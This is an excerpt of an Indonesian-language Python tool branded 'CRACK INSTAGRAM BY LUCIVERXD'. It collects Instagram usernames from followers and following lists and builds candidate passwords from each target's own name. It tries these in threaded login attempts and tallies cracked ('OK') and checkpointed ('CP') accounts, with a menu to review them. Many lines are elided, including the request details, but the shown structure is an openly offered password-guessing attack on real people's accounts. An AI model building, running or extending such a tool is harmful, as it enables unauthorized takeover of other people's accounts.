...
reset = "[/]"
uadia, uadarimu, prox = [], [], []
sys.stdout.write('\x1b]2; LuciverXD\x07')
...
class Instagram:
    ...
    def __init__(self):
        ...
        self.id, self.lo = [], 0
        self.gett()
       #self.Rayan = self.ses.get("https://api.countapi.xyz/hit/LuciverXD/visits").json()["value"]
        self.menu()
...
\t╚═══╩═══╩═══╩╝╚═╩══╩═══╝""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    def logoo(self):
      ...
      #  prints(f"{H2}CRACK INSTAGRAM BY RAYANXD{reset}")
        prints(Panel(f"""{H2} .____                  .__                    
|    |    __ __   ____ |__|__  __ ___________      
|    |   |  |  \_/ ___\|  \  \/ // __ \_  __ \           
|    |___|  |  /\  \___|  |\   /\  ___/|  | \/           
|_______ \____/  \___  >__| \_/  \___  >__|    
        \/           \/              \/
        𝕄𝕒𝕕𝕖 𝔹𝕪 {M2}𝔸𝕣𝕚 𝕄𝕒𝕣𝕤𝕙𝕖𝕝𝕝𝕠 {P2}ℂ𝕠𝕕𝕖𝕣        
        CRACK INSTAGRAM BY LUCIVERXD""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
  ...
  #      self.loadCookie(Instagram)
        ...
        try:
            ...
            if "full_name" in str(xx):
                ...
                prints(Panel(f"{P2}Selamat Datang {color_rich}{nama}{P2} Login Berhasil Jalankan Ulang python LuciIG.py",width=80,padding=(0,4),style=f"{color_table}"))
                time.sleep(3);exit()
 ...
 #           self.bots()        
    ...
    def lains(self):
        prints(Panel(f"{P2}[{color_rich}01{P2}]. Check Akun Hasil Crack     {P2}[{color_rich}03{P2}]. Settting UserAgent\n{P2}[{color_rich}02{P2}]. Gabung Group WhatsApp LuciverXD      {P2}[{color_rich}04{P2}]. Ambil UserAgent",width=80,padding=(0,7),style=f"{color_table}"))
        prints(Panel(f"{P2}[{color_rich}05{P2}]. Lihat Jumlah Pengguna Script LuciverXD\n{P2}[{color_rich}06{P2}]. Ganti Warna Tema Tools LuciverXD",width=80,padding=(0,13),style=f"{color_table}"))
        ...
        if ask in ["",""]:
           ...
           time.sleep(2);self.menu()
            ...
            prints(Panel(f"{P2}Jumlah Pengguna Script LuciverXD {color_rich}{self.Rayan}{P2} Orang",width=80,padding=(0,15),style=f"{color_table}"))
            time.sleep(3)
...
{N}[{H}+{N}] {H}•• LIVE ••{N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
                ...
                for user in self.id:
                    ...
                    for pasw in nama.split(" "):
                        ...
                        if 'satu' in method:
                           ...
                           bool.submit(self.Ngocok, usez, sandi)
            print("\r")
            prints(Panel(f" {P2}LuciverXD {color_rich}{len(self.id)} {P2}Username Selesai Hasil OK : {H2}{len(self.ok)}{P2} Hasil CP : {K2}{len(self.cp)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
            time.sleep(3);exit()
    ...
    def crakersAPI(self, user, pasw):
        prog.update(des,description=f"[{H2} LuciverXD {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
              ...
              try:
                    with requests.Session() as ses:
                         ...
                         #     os.popen('play-audio raycp.mp3')
                              ...
                              prog.update(des,description=f"[{M2} LuciverXD {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                              time.sleep(15)
    ...
    def Ngocok(self, user, pasw):
        ...
        prog.update(des,description=f" LuciverXD ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
             ...
             #       os.popen('play-audio raycp.mp3')
                    ...
                    prog.update(des,description=f"LuciverXD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"LuciverXD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                prog.advance(des)
